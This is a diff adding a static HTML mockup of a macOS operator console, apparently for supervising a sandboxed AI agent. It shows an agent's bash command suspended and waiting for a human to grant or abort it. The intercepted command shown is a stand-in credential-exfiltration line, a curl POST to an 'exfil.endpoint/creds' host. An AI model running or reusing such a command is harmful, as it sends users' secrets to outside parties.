@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en" class="bg-[#020305] text-slate-100 antialiased selection:bg-[#EF4444] selection:text-white">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SCRAMKD // Native macOS Supervisor Console Viewport</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #020305;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .font-mono {
+      font-family: 'Geist Mono', monospace;
+    }
+    .grid-matrix {
+      background-image: 
+        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+      background-size: 20px 20px;
+    }
+    .hazard-stripes {
+      background: repeating-linear-gradient(
+        -45deg,
+        #EF4444,
+        #EF4444 12px,
+        #DC2626 12px,
+        #DC2626 24px
+      );
+    }
+    .spec-dot-grid {
+      background-image: radial-gradient(rgba(255, 255, 255, 0.08) 1px, transparent 0);
+      background-size: 16px 16px;
+    }
+  </style>
+</head>
+<body class="p-4">
+
+  <!-- MASTER MACOS OPERATIONS WINDOW (1200x675) -->
+  <div class="w-[1200px] h-[675px] bg-[#04060A] border border-white/10 flex flex-col relative select-none shadow-2xl overflow-hidden">
+    
+    <!-- TOP NATIVE MACOS WINDOW HEADER BAR (36px) -->
+    <header class="h-[36px] bg-[#090D15] border-b border-white/10 px-4 flex items-center justify-between z-20 shrink-0">
+      <!-- Window Controls (Hollow 10px circles with 1px slate-500 border) -->
+      <div class="flex items-center gap-2">
+        <span class="w-[10px] h-[10px] rounded-full border border-[#64748B] inline-block bg-transparent"></span>
+        <span class="w-[10px] h-[10px] rounded-full border border-[#64748B] inline-block bg-transparent"></span>
+        <span class="w-[10px] h-[10px] rounded-full border border-[#64748B] inline-block bg-transparent"></span>
+        <span class="ml-3 font-mono text-[10px] font-semibold text-slate-500 tracking-widest uppercase">TACTICAL_APP // METALKIT.P3</span>
+      </div>
+
+      <!-- Center Title Spec -->
+      <div class="font-mono text-[11px] text-slate-300 font-semibold tracking-wider flex items-center gap-2">
+        <span class="w-1.5 h-1.5 bg-[#EF4444]"></span>
+        <span>SCRAMKD // CONSOLE PID: 24347 // ARM64E DARWIN 23.4</span>
+      </div>
+
+      <!-- Right Security Badges -->
+      <div class="flex items-center gap-3">
+        <span class="font-mono text-[9px] text-slate-400 bg-white/5 border border-white/10 px-2 py-0.5 tracking-wider">AUDIO_SVS: 440HZ</span>
+        <span class="font-mono text-[10px] font-bold text-[#10B981] bg-[#10B981]/10 border border-[#10B981]/30 px-2.5 py-0.5 tracking-wider">
+          [ SWIFT 6.0 STRICT // ZERO EGRESS ]
+        </span>
+      </div>
+    </header>
+
+    <!-- MAIN VIEWPORT COMPOSITION (Split View) -->
+    <main class="flex-1 flex overflow-hidden">
+      
+      <!-- LEFT VIEWPORT (65% Width, ~780px) -->
+      <section class="w-[65%] h-full flex flex-col border-r border-white/10 bg-[#06080E] relative p-3">
+        
+        <!-- Viewport Sub-header / Status Bar -->
+        <div class="flex items-center justify-between pb-2 border-b border-white/5 font-mono text-[10px] text-slate-400">
+          <div class="flex items-center gap-2">
+            <span class="text-white font-bold tracking-wider">CH-01: SCREENENV CONTAINER RFB FRAMEBUFFER</span>
+            <span class="text-slate-600">//</span>
+            <span class="text-slate-500">1920x1080@60Hz (RGBX)</span>
+          </div>
+          <div class="flex items-center gap-3">
+            <span class="text-amber-400 font-medium">DISPATCH: TRAPPED</span>
+            <span class="text-emerald-400 font-semibold">MTKVIEW: ACTIVE</span>
+          </div>
+        </div>
+
+        <!-- RFB Desktop Canvas & Interlock Screen Display -->
+        <div class="flex-1 mt-2.5 bg-[#0A0E17] border border-[#64748B]/60 relative flex flex-col justify-between overflow-hidden spec-dot-grid">
+          
+          <!-- Virtual OS Window Header (XFCE4 Top Bar Mockup) -->
+          <div class="h-6 bg-[#111726] border-b border-white/10 px-3 flex items-center justify-between font-mono text-[9px] text-slate-400">
+            <div class="flex items-center gap-3">
+              <span class="text-slate-200 font-bold">ubuntu@amhma-sandbox: ~</span>
+              <span class="text-slate-600">|</span>
+              <span>bash -c "curl -X POST https://exfil.endpoint/creds"</span>
+            </div>
+            <div class="flex items-center gap-2">
+              <span class="text-[#EF4444] font-mono font-bold">[SUSPENDED: SIGSTOP]</span>
+              <span>CPU: 0.1%</span>
+              <span>RAM: 312MB</span>
+            </div>
+          </div>
+
+          <!-- Virtual Terminal Content behind Interlock -->
+          <div class="p-4 font-mono text-[11px] text-slate-500 space-y-1.5 leading-relaxed opacity-40">
+            <div>ubuntu@desktop-runtime:~$ sudo systemctl status mcp-server.service</div>
+            <div class="text-emerald-500/80">● mcp-server.service - Model Context Protocol High-Assurance Sandbox Bridge</div>
+            <div>&nbsp;&nbsp;&nbsp;Loaded: loaded (/lib/systemd/system/mcp-server.service; enabled; vendor preset: enabled)</div>
+            <div>&nbsp;&nbsp;&nbsp;Active: active (running) since Tue 2026-04-14 09:12:04 UTC; 4min ago</div>
+            <div>&nbsp;&nbsp;&nbsp;Main PID: 1042 (fastmcp-adapter)</div>
+            <div>[TASK] INCOMING DISPATCH: screenenv.bash_execute &gt;&gt; token verification pass</div>
+            <div>[PIPE] FIFO WRITE LEASE ACQUIRED fd: 18 (chunk: 16384 B)</div>
+            <div class="text-[#EF4444]/90">[KERNEL TRAP] Intercepted Darwin-XNU boundary hook: DarwinInterlockBridge</div>
+          </div>
+
+          <!-- CENTER SCREEN OVERLAY: OPAQUE HORIZONTAL ALERT BAND -->
+          <div class="absolute inset-x-0 top-1/2 -translate-y-1/2 bg-[#F59E0B] px-8 py-5 border-y-2 border-black/80 shadow-2xl z-30">
+            <div class="max-w-xl mx-auto flex flex-col items-center text-center">
+              <div class="flex items-center gap-3 mb-1">
+                <div class="w-2.5 h-2.5 bg-black"></div>
+                <div class="font-mono text-[14px] font-black text-black tracking-[0.25em] uppercase">
+                  /// HARDWARE INTERLOCK: ARMED ///
+                </div>
+                <div class="w-2.5 h-2.5 bg-black"></div>
+              </div>
+              <div class="font-mono text-[11px] font-bold text-black/90 tracking-widest uppercase">
+                SUSPENDED AT POSIX BOUNDARY // LEASE ONE-SHOT REQUIRED
+              </div>
+              <div class="mt-2 text-[9px] font-mono text-black/80 border border-black/30 px-3 py-0.5 tracking-wider font-semibold">
+                DARWIN HOST TRAP: FAST_MCP_INTERLOCK_CONTINUATION_WAIT
+              </div>
+            </div>
+          </div>
+
+          <!-- Bottom Virtual Terminal Watermark & Micro Telemetry Bar -->
+          <div class="bg-[#090D15] border-t border-white/10 px-3 py-1.5 font-mono text-[10px] text-slate-400 flex items-center justify-between z-10">
+            <div class="tracking-tight text-slate-300">
+              MACH_TASK_MEM: <span class="text-white font-semibold">42.1MB</span> | MTKVIEW: <span class="text-[#10B981] font-semibold">60.0 FPS</span> | DRIFT: <span class="text-amber-400 font-semibold">&lt; 0.2ms</span> | SIGPIPE: <span class="text-emerald-400 font-semibold">SUPPRESSED</span>
+            </div>
+            <div class="text-[9px] text-slate-500 tracking-widest uppercase">
+              RENDER: P3 DISPLAY ENGINE
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- RIGHT VIEWPORT (35% Width, ~420px) -->
+      <section class="w-[35%] h-full bg-[#070A10] flex flex-col justify-between p-3.5 space-y-3 overflow-hidden">
+        
+        <!-- SECTION TITLE BAR -->
+        <div class="flex items-center justify-between border-b border-white/10 pb-1.5 shrink-0">
+          <div class="font-mono text-[11px] font-bold text-white tracking-widest flex items-center gap-2">
+            <span class="w-1.5 h-1.5 bg-[#F59E0B]"></span>
+            <span>SVS TELEMETRY &amp; CLEARANCE RECORD</span>
+          </div>
+          <span class="font-mono text-[9px] text-slate-500 tracking-wider">CH-02 // ISOL-99</span>
+        </div>
+
+        <!-- CARD A: CLEARANCE RECORD #9042-A -->
+        <div class="bg-[#090D15] border border-[#EF4444]/60 p-3 shrink-0 flex flex-col relative">
+          <!-- Top Tag -->
+          <div class="flex items-center justify-between mb-2 pb-1.5 border-b border-white/5">
+            <span class="font-mono text-[10px] font-bold text-[#EF4444] tracking-widest uppercase flex items-center gap-1.5">
+              <span class="w-1.5 h-1.5 bg-[#EF4444] animate-pulse"></span>
+              CLEARANCE RECORD #9042-A
+            </span>
+            <span class="font-mono text-[9px] bg-[#EF4444]/20 text-[#EF4444] border border-[#EF4444]/40 px-1.5 py-0.2 font-semibold">
+              SEVER ARMED
+            </span>
+          </div>
+
+          <!-- Payload Metadata Fields -->
+          <div class="space-y-1.5 font-mono text-[11px]">
+            <div>
+              <span class="text-slate-500 text-[10px] block uppercase tracking-wider">Target Intercept Hook:</span>
+              <span class="text-white font-bold bg-white/5 px-1.5 py-0.5 border border-white/10 block mt-0.5 text-[10.5px]">
+                HOOK: screenenv.bash_execute
+              </span>
+            </div>
+
+            <div>
+              <span class="text-slate-500 text-[10px] block uppercase tracking-wider">Payload Cryptographic Digest:</span>
+              <div class="text-slate-300 bg-black/40 p-1.5 border border-white/5 text-[9.5px] leading-tight break-all font-medium mt-0.5 text-amber-200/90">
+                PAYLOAD SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+              </div>
+            </div>
+
+            <div class="flex items-center justify-between pt-1 text-[11px]">
+              <span class="text-slate-400 font-semibold tracking-wide">LEASE TIMEOUT:</span>
+              <span class="text-[#EF4444] font-extrabold bg-[#EF4444]/10 border border-[#EF4444]/30 px-2 py-0.5 tracking-wider">
+                TIMEOUT TTL: 4.8s (AUTO-ABORT)
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- CARD B: COREAUDIO SVS ANNUNCIATOR BRIDGE -->
+        <div class="bg-[#090D15] border border-white/10 p-3 flex-1 flex flex-col justify-between overflow-hidden">
+          <div class="flex items-center justify-between mb-1 pb-1 border-b border-white/5 shrink-0">
+            <span class="font-mono text-[10px] font-bold text-slate-200 tracking-wider uppercase">
+              COREAUDIO SVS ANNUNCIATOR BRIDGE
+            </span>
+            <span class="font-mono text-[9px] text-[#F59E0B] font-semibold">440.00 Hz AUDIO BUS</span>
+          </div>
+
+          <!-- Oscilloscope Viewport (SVG Sine Waveform) -->
+          <div class="w-full flex-1 bg-[#05070B] border border-white/5 relative flex items-center justify-center overflow-hidden my-1.5">
+            <!-- Reticle Crosshairs and Grid Lines -->
+            <div class="absolute inset-0 grid grid-cols-6 grid-rows-4 pointer-events-none opacity-20">
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-r border-b border-white/30"></div>
+              <div class="border-b border-white/30"></div>
+              <div class="border-r border-white/30"></div>
+              <div class="border-r border-white/30"></div>
+              <div class="border-r border-white/30"></div>
+              <div class="border-r border-white/30"></div>
+              <div class="border-r border-white/30"></div>
+              <div></div>
+            </div>
+
+            <!-- Sinusoidal Trace -->
+            <svg class="w-full h-full" viewBox="0 0 360 80" preserveAspectRatio="none">
+              <!-- Center axis line -->
+              <line x1="0" y1="40" x2="360" y2="40" stroke="#64748B" stroke-width="0.75" stroke-dasharray="2 2" opacity="0.4"/>
+              
+              <!-- 440 Hz Sine Trace (Amber #F59E0B) -->
+              <path d="M 0 40 
+                       Q 22.5 10, 45 40 T 90 40 
+                       T 135 40 T 180 40 
+                       T 225 40 T 270 40 
+                       T 315 40 T 360 40" 
+                    fill="none" 
+                    stroke="#F59E0B" 
+                    stroke-width="2.5" 
+                    stroke-linecap="square"/>
+              
+              <!-- Envelope Fill Under Curve -->
+              <path d="M 0 40 
+                       Q 22.5 10, 45 40 T 90 40 
+                       T 135 40 T 180 40 
+                       T 225 40 T 270 40 
+                       T 315 40 T 360 40 L 360 80 L 0 80 Z" 
+                    fill="rgba(245, 158, 11, 0.08)"/>
+
+              <!-- Cursor / Sample Marker -->
+              <circle cx="180" cy="40" r="3" fill="#EF4444" stroke="#FFFFFF" stroke-width="1"/>
+            </svg>
+
+            <!-- Overlay Readout -->
+            <div class="absolute top-1 left-2 font-mono text-[9px] text-[#F59E0B] bg-black/60 px-1 border border-[#F59E0B]/30">
+              V_PEAK: 0.707 FS
+            </div>
+            <div class="absolute bottom-1 right-2 font-mono text-[9px] text-slate-400 bg-black/60 px-1 border border-white/10">
+              PERIOD: 2.27ms
+            </div>
+          </div>
+
+          <!-- Annunciator Tone Status -->
+          <div class="mt-1 font-mono text-[10px] text-slate-300 leading-tight bg-black/30 p-1.5 border border-white/5">
+            <span class="text-amber-400 font-bold block">EMITTING: ToneCue.armedPulse</span>
+            <span class="text-slate-400 text-[9.5px]">(440Hz SINE, 0.15s, 0.7 AMP // CIRCULAR DRAIN)</span>
+          </div>
+        </div>
+
+        <!-- CARD C: OPERATOR ACTION MATRIX (Action Buttons) -->
+        <div class="bg-[#090D15] border border-white/10 p-3 shrink-0 flex flex-col space-y-2">
+          <div class="flex items-center justify-between pb-1 border-b border-white/5 font-mono text-[9px] text-slate-400">
+            <span class="uppercase tracking-widest text-slate-300 font-bold">OPERATOR INTERLOCK MATRIX</span>
+            <span class="text-amber-400 font-bold">MANUAL TRIP REQUIRED</span>
+          </div>
+
+          <!-- Dual Button Grid -->
+          <div class="grid grid-cols-2 gap-2 pt-0.5">
+            
+            <!-- Button 1: GRANT PERMISSIVE (SPACE) -->
+            <button class="h-12 bg-black border-2 border-[#10B981] flex flex-col items-center justify-center hover:bg-[#10B981]/10 transition-colors group cursor-pointer">
+              <span class="font-mono text-[10px] font-bold text-[#10B981] tracking-wider group-hover:scale-105 transition-transform">
+                [ GRANT PERMISSIVE ]
+              </span>
+              <span class="font-mono text-[8.5px] text-emerald-400/80 tracking-widest mt-0.5 font-medium">
+                KEY: SPACE // 1x LEASE
+              </span>
+            </button>
+
+            <!-- Button 2: EMERGENCY ABORT (ESC) -->
+            <button class="h-12 hazard-stripes border-2 border-black flex flex-col items-center justify-center hover:opacity-95 transition-opacity group cursor-pointer shadow-md">
+              <span class="font-mono text-[10.5px] font-black text-black tracking-wider bg-white/95 px-1.5 py-0.2 border border-black/40">
+                [ EMERGENCY ABORT ]
+              </span>
+              <span class="font-mono text-[8.5px] text-black font-extrabold tracking-widest mt-0.5 bg-white/80 px-1">
+                KEY: ESC // SIGKILL
+              </span>
+            </button>
+
+          </div>
+
+          <!-- Audit Ledger Note -->
+          <div class="pt-1 flex items-center justify-between font-mono text-[8.5px] text-slate-500">
+            <span>MUTEX: OSAllocatedUnfairLock</span>
+            <span>AUDIT: RFC-5424 IMMUTABLE</span>
+          </div>
+        </div>
+
+      </section>
+
+    </main>
+
+    <!-- FOOTER CHASSIS RUNNER (18px) -->
+    <footer class="h-[20px] bg-[#090D15] border-t border-white/10 px-4 flex items-center justify-between font-mono text-[9px] text-slate-500 z-20 shrink-0">
+      <div class="flex items-center gap-3">
+        <span class="text-[#EF4444] font-bold">● HOST STATUS: INTERCEPT_ACTIVE</span>
+        <span>SPEC: MIL-STD-1472H</span>
+        <span>KERNEL BOUNDARY: RING-0 POSIX SHIM</span>
+      </div>
+      <div>
+        <span>SCRAMKD SYSTEMS CORP // HARMONIZED INDUSTRIAL RUNTIME SPEC</span>
+      </div>
+    </footer>
+
+  </div>
+
+</body>
+</html>
